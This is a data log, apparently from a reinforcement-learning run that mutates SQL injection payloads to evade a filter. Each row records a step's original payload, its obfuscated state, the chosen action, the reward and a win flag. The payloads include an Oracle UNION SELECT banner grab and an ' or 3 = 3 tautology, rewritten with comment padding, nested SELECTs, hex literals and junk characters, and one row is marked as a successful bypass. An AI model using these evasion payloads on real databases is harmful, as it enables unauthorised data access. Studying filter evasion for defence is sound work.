;episode;step;original_payload;state;action;next_state;reward;win
135;5;16;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";5;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
136;5;17;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";14;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";0.0;0
137;5;18;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";9;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";0.0;0
138;5;19;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";6;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";0.0;0
139;5;20;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";10;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";0.0;0
140;5;21;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
1)))/**/--/**/1""";1;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";0.0;0
141;5;22;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";23;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";0.0;0
142;5;23;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";11;""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";0.0;0
143;5;24;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT (SELECT#.~a#q^-
1)))   union select null,banner from v$version where rownum = (SELECT (SELECT (SELECT#.~a#q^-
1))) -- 1""";10;"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";0.0;0
144;5;25;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";15;"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";0.0;0
145;5;26;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";23;"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";0.0;0
146;5;27;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";12;"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";0.0;0
147;5;28;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""
 select
 *
 from
 users
 where
 id
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 
 
 union
 select
 null,banner
 from
 v$version
 where
 rownum
 =
 (SELECT
 (SELECT
 (SELECT#.~a#q^-
1)))
 --
 1""";10;"""

 select

 *

 from

 users

 where

 id

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 

 

 union

 select

 null,banner

 from

 v$version

 where

 rownum

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 --

 1""";0.0;0
148;5;29;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""

 select

 *

 from

 users

 where

 id

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 

 

 union

 select

 null,banner

 from

 v$version

 where

 rownum

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 --

 1""";23;"""

 select

 *

 from

 users

 where

 id

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 

 

 union

 select

 null,banner

 from

 v$version

 where

 rownum

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 --

 1""";0.0;0
149;5;30;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""

 select

 *

 from

 users

 where

 id

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 

 

 union

 select

 null,banner

 from

 v$version

 where

 rownum

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 --

 1""";4;"""

 select

 *

 from

 users

 where

 id

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 

 

 union

 select

 null,banner

 from

 v$version

 where

 rownum

 =

 (SELECT

 (SELECT

 (SELECT#.~a#q^-
1)))

 --

 1""";0.0;0
150;6;1;' or 3 = 3;' or 3 = 3;24;' or 3 = 3;0.8;0
151;6;2;' or 3 = 3;' or 3 = 3;20;' or 3 = 3;0.7000000000000001;0
152;6;3;' or 3 = 3;' or 3 = 3;21;' or 3 = 3;0.6000000000000001;0
153;6;4;' or 3 = 3;' or 3 = 3;23;' or 3 = 3;0.5;0
154;6;5;' or 3 = 3;' or 3 = 3;7;' or 0x3 = 3;1.2000000000000002;0
155;6;6;' or 3 = 3;' or 0x3 = 3;14;"'#^sX(w
or#^sX(w
0x3#^sX(w
=#^sX(w
3";9.5;1
